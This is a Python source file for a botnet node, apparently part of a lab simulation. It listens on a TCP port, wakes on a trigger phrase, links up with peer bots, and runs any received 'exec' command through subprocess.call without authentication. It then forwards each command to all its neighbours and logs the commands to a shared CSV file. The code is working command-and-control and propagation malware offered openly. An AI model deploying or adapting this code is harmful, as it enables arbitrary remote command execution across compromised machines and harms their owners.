from subprocess import call,  CalledProcessError
import socket
import _thread
import os
import csv
import pandas as pd 
import lockfile

class Bot:

    def __init__(self):
        self.Neighbors = {}
        self.host = '127.0.0.1'
        self.isAsleep = True
        self.port = 42345
        self.lastCmd = set()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.bind(('', self.port))
        if not os.path.isfile("./host-share/bots.csv"):
            with open ("./host-share/bots.csv", 'w') as bots:
                writerB = csv.writer(bots)
                writerB.writerow(['ip_addr', 'state','neighbors', 'lastCMD'])
                bots.close()
        with open("./host-share/bots.csv", 'a') as bots:
            ip = socket.gethostbyname(socket.gethostname())
            writerB = csv.writer(bots)
            neighbors = []
            writerB.writerow([ip, 'asleep', "[]", None])

    def sleep(self):
        s = self.connection
        s.listen()
        conn, addr = s.accept()
        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                elif data.decode() == "Wake up sleeper agent":
                    self.isAsleep = False
                    conn.send("BOT @ {} is awake".format(conn.getsockname()).encode())
                    neighbors = conn.recv(1024)
                    neighbors = neighbors.decode().split(' ')
                    print (neighbors)
                    if len(neighbors) > 0 and neighbors[0] != '':
                        self.join_botnet(neighbors)
                    break
                elif data.decode() == "Update Request":
                    conn.send(str(self.isAsleep).encode())
                else:
                    pass


    def list_back(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 42346))
        while True:
            s.listen()
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024)
                if data.decode() == "Update Request":
                    conn.send(str(self.isAsleep).encode())

    
    def listen(self):
        s = self.connection
        s.listen()
        conn, addr = s.accept()
        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                elif data.decode() == "Go back to sleep":
                    self.isAsleep = True
                    conn.send("BOT @ {} is asleep".format(conn.getsockname()).encode())
                    break
                elif "exec" in data.decode():
                    command = data.decode().split(' ')
                    id = command[0]
                    cmd = command[2]
                    if id not in self.lastCmd:
                        self.lastCmd.add(id)
                        origin = str(conn.getpeername()[0])
                        cmd_status = self.__executeCmd(cmd)
                        conn.send(str(cmd_status).encode())
                        print("connected to ", origin)
                        self.forwardCmd(data.decode(), origin)
                elif data.decode() == "Kill bot":
                    kill_conf = "Bot kill confirmed"
                    conn.send(kill_conf.encode())
                    exit(1)
                elif data.decode() == "New Bot joining Botnet":
                    self.Neighbors[conn.getpeername()[0]] = 1
                    #df = pd.read_csv("./host-share/bots.csv")
                    #ip_addr = socket.gethostbyname(socket.gethostname())
                    #df.loc[df['ip_addr']==ip_addr, ['neighbors']] = str(list(self.Neighbors.keys()))
                    #df.to_csv("./host-share/bots.csv", index=False)
                    answer = "Welcome from {}".format(conn.getsockname()[0])
                    conn.send(answer.encode())
                elif data.decode() == "Update Request":
                    conn.send(str(self.isAsleep).encode())
                elif data.decode() == "Show Neighbors":
                    #if not self.Neighbors:
                    #    conn.send("[]".encode())
                    #else:
                    conn.send(str(list(self.Neighbors.keys())).encode())


    def forwardCmd(self, cmd, origin):
        print(self.Neighbors)
        for host in self.Neighbors.keys():
            if host != origin:
                print("forwarding to ", host)
                _thread.start_new_thread(self.sendCmd, (cmd, host))

    def sendCmd(self, cmd, host):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                if self.Neighbors[host] == 1:
                    s.connect((host, self.port))
                    s.sendall(cmd.encode())
                s.close()
            except OSError or socket.error or ConnectionRefusedError or ConnectionError as e:
                pass

    def join_botnet(self, neighbors):
        for host in neighbors:
            print("joining host ", host)
            _thread.start_new_thread(self.connect_neightbor, (host,))


    def connect_neightbor(self, host):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, self.port))
            s.sendall("New Bot joining Botnet".encode())
            response = s.recv(1024)
            print(response.decode())
            if response.decode() == "Welcome from {}".format(host):
                self.Neighbors[host] = 1
                #df = pd.read_csv("./host-share/bots.csv")
                #ip_addr = socket.gethostbyname(socket.gethostname())
                #df.loc[df['ip_addr']==ip_addr, ['neighbors']] = str(list(self.Neighbors.keys()))
                #df.to_csv("./host-share/bots.csv", index=False)
                
                #print(listNeighbors)
                #print(type(list(df.loc[df['ip_addr']==ip_addr, ['neighbors']])))
                #list(dataframe.at[ip_addr, 'neighbors']).append(host)


    @staticmethod
    def __executeCmd(cmd):
        print(cmd)
        ip_addr = socket.gethostbyname(socket.gethostname())
        with lockfile.LockFile("./host-share/bots.csv"):
            df = pd.read_csv("./host-share/bots.csv")
            df.loc[df['ip_addr']==ip_addr, ['lastCMD']] = cmd
            df.to_csv("./host-share/bots.csv", index=False)
        try:
            call(cmd)
        except CalledProcessError as e:
            print(e)
            return e
        except OSError as e:
            return e
        return "Command successfully executed!"



def main():
    bot = Bot()
    _thread.start_new_thread(bot.list_back, ())
    while True:
        while bot.isAsleep:
            bot.sleep()
        bot.listen()


if __name__ == "__main__":
    main()

